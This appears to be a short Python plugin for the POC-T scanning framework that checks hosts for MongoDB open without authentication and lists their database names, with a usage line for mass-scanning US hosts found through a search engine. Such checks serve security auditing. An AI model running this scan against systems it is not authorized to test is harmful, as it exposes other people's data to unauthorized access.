#!/usr/bin/python
# -*- coding: UTF-8 -*-
# project = https://github.com/Xyntax/POC-T
# author Double8

"""
MongodDB未授权访问

Usage:
  python POC-T.py -s mongodb-unauth -aZ "port:27017 country:us"

"""

import pymongo
from plugin.util import host2IP
from plugin.util import checkPortTcp


def poc(url):
    ip = host2IP(url).split(':')[0]
    port = 27017
    try:
        if not checkPortTcp(ip, port):
            return False
        conn = pymongo.MongoClient(ip, port, socketTimeoutMS=3000)
        dbs = conn.database_names()
        return ip + ' -> ' + '|'.join(dbs) if dbs else False
    except Exception:
        return False
